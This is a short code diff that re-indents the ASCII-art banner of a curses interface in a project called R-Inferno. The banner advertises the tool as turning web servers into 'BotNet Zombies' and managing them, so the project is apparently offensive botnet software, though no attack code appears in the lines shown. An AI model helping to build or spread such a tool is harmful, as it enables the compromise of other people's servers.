@@ -23,11 +23,11 @@ def print_banner(stdscr):
 	         / _, _/_____// // / / / __/  __/ /  / / / / /_/ /
 	        /_/ |_|     /___/_/ /_/_/  \___/_/  /_/ /_/\____/
 
-            https://github.com/Rezn0y/R-Inferno v1.0.0
+	            https://github.com/Rezn0y/R-Inferno v1.0.0
 
-                    Rezn0y: R-Inferno Project
-            Transform Web Servers Into BotNet Zombies.
-                    Manage your zombies. ϟϟ
+	                    Rezn0y: R-Inferno Project
+	            Transform Web Servers Into BotNet Zombies.
+	                    Manage your zombies. ϟϟ
     """
     stdscr.addstr(0, 0, banner, curses.color_pair(1))
 
